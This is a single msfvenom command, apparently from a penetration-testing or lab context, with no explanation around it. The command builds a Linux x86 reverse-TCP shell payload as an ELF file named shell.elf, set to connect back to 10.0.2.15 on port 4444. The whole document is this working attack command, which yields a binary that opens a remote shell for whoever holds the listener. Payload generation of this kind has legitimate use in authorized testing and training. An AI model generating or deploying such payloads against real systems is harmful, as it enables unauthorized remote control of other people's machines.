msfvenom --payload linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f elf > shell.elf